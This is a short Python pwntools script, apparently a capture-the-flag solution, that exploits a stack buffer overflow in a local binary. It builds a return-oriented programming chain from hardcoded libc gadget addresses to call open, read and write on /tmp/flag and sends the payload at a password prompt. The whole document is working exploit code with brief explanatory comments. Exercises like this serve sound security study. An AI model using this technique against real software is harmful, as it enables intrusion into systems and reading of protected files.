from pwn import *
io = process('./a.out')

elf = ELF('./a.out')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc"s base_addr
base_addr = 0x7ffff7dcb000	
# func : rdi-rsi-rdx-rcx-r8-r9
poprdi_ret = base_addr + 0x27725
poprsi_ret = base_addr + 0x28ed9
poprdx_ret = base_addr + 0xfdd4d
# write /tmp/flag to writable_addr
writable_addr = 0x404700
# "/tmp/flag" stored in string_addr 
string_addr = 0x7fffffffde30
# we need to write string /tmp/flag at the header of buffer
fileName = b'/tmp/flag\0' 
payload = fileName + cyclic(72 - len(fileName)) # buffer length + rbp
# we will execute 'open("/tmp/flag", 0)'
# rdi = "/tmp/flag" rsi = 0
payload += p64(poprdi_ret)
payload += p64(string_addr)
payload += p64(poprsi_ret)
payload += p64(0)
payload += p64(base_addr + libc.symbols['open'])
# we will execute 'read(3, writable_addr, 10)' to read the FLAG
# rdi = 3 rsi = writable_addr rdx = 10
payload += p64(poprdi_ret)
payload += p64(3)
payload += p64(poprsi_ret)
payload += p64(writable_addr)
payload += p64(poprdx_ret)
payload += p64(10)
payload += p64(base_addr + libc.symbols['read'])

# we will execute 'write(1, writable_addr, 10)' to write FLAG into console
# rdi = 1 rsi = writable_addr rdx = 10
payload += p64(poprdi_ret)
payload += p64(1)
payload += p64(poprsi_ret)
payload += p64(writable_addr)
payload += p64(poprdx_ret)
payload += p64(10)
payload += p64(base_addr + libc.symbols['write'])

# gdb.attach(io, "b *(start+146)") # we can raise a debug interface here
# time.sleep(3)
io.sendafter(b'Password:', payload)
io.interactive()


